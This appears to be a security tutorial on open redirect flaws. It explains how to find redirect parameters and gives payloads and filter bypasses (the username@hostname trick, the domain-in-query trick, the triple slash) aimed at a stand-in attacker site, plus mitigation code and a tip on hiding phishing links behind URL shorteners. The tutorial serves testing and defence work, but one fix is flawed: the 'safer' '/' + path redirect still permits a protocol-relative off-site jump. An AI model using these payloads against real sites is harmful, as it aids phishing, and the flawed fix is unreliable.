# Open Redirect

### What is an Open Redirect Vulnerability?

An open redirect occurs when a flaw in a website’s client-side or server-side code allows an attacker to redirect a user to a malicious site by abusing a legitimate website’s redirect functionality. This is often used in phishing attacks because the victim sees a trusted domain in the URL before being redirected.

***

### Exploitation in Practice

#### Discovery

Look for URL parameters that look like paths or URLs. For example:

```perl
https://site.com/login?ReturnURL=https://site.com/my-account
https://site.com/form-complete?return=/completed
https://site.com/api/v2/redirect?url=https://site.com/404
```

If there are no obvious parameters, try fuzzing for hidden ones using a tool like `ffuf` or Burp Suite.

A good parameter wordlist is `burp-parameter-names.txt`. If you have SecLists installed, you can find it at `/usr/share/seclists/Discovery/Web-Content`. On Kali Linux, install it with:

```bash
apt install seclists
```

or download it from GitHub: [SecLists](https://github.com/danielmiessler/SecLists)

***

#### Exploitation

If the parameter contains a URL like `https://site.com/my-account`, change it to your malicious URL:

```perl
https://site.com/login?ReturnURL=https://attacker-website.com
```

If the parameter is a path, like `/completed`, try replacing it with a full URL. If that fails, use tricks like the `username@hostname` syntax.

#### Username\@Hostname Bypass

Some sites concatenate the parameter to their own domain, like this:

```javascript
app.get('/form-complete', (req, res) => {
  var redirectPath = req.query.return;
  res.redirect('https://site.com' + redirectPath);
});
```

If you pass `@attacker-website.com` as the parameter, it produces:

```http
Location: https://site.com@attacker-website.com
```

Browsers interpret `site.com` as a username, so the request goes to `attacker-website.com`.

Example request:

```vbnet
GET /form-complete?return=@attacker-website.com HTTP/1.1
Host: site.com
```

Result: the victim is redirected to the attacker’s site.

***

### Common Defense Evasions

#### 1. Includes Domain

If the application checks that the target URL includes its own domain, bypass it by adding the domain as a parameter to your own site:

```perl
https://site.com/login?return=https://attacker-website.com/?foo=site.com
```

Payload: `https://attacker-website.com/?foo=site.com`

***

#### 2. Starts With Domain

If the site checks whether the URL starts with the domain, bypass it with the same `username@hostname` trick:

```perl
https://site.com/login?return=https://site.com@attacker-website.com
```

Payload: `https://site.com@attacker-website.com`

***

#### 3. Blacklist

If the application blacklists `http://` and `https://` by matching the entire string, you can sometimes bypass it by adding an extra slash:

```perl
https://site.com/login?return=https:///attacker-website.com
```

Payload: `https:///attacker-website.com` (notice the third slash)

***

### Mitigation

1. Avoid dynamic redirects when possible; use hardcoded URLs.
2. If dynamic redirects are needed, prefix the URL with `/` to enforce an internal path:

   ```javascript
   // Safer
   res.redirect('/' + path);

   // Risky
   res.redirect('https://site.com' + path);
   ```
3. Use strict validation with regex or a whitelist of allowed paths:

   ```javascript
   re = /^[\w/]+$/;
   if (re.test(req.query.return)) {
     res.redirect(req.query.return);
   } else {
     res.redirect('/error');
   }
   ```

***

### Tips

* Use [webhook.site](https://webhook.site) to test your payloads in practice.
* Burp Suite has extensions specifically for finding open redirects.
* URL shorteners can help hide malicious redirect URLs in phishing attacks.
